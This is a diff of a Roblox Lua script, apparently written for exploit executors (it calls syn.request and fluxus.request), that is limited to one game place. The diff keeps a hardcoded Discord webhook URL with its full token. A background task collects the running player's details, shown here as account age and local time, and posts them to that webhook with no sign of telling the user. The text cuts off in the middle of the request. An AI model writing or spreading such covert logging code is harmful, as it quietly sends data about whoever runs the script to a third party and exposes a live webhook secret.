@@ -1,11 +1,20 @@
---// Webhook
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1466552183444078706/KK4pLVoGu0K_NQPy8-0I47-pQvKTr27zMP-1-3LNYbhdN3Yr288aFXROAsMljtRFevgK"
-local req = (syn and syn.request) or http_request or request or (fluxus and fluxus.request)
-
--- ✅ يمنع السكربت من العمل خارج التجربة
+--// تشغيل السكربت فقط داخل التجربة المحددة
 if game.PlaceId ~= 131623223084840 then
     return
 end
+
+--// Services
+local TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local workspace = game:GetService("Workspace")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local UserInputService = game:GetService("UserInputService")
+
+--// Webhook
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1466552183444078706/KK4pLVoGu0K_NQPy8-0I47-pQvKTr27zMP-1-3LNYbhdN3Yr288aFXROAsMljtRFevgK"
+local req = (syn and syn.request) or http_request or request or (fluxus and fluxus.request)
 
 if req then
     task.spawn(function()
@@ -21,7 +30,7 @@ if req then
         local accountAge = tostring(player.AccountAge) .. " Days"
         local timeNow = os.date("%I:%M %p")
 
-        -- ✅ رسالة واحدة فقط (شكل الصورة)
+        -- ✅ رسالة واحدة فقط (زي الصورة)
         pcall(function()
             req({
                 Url = WEBHOOK_URL,
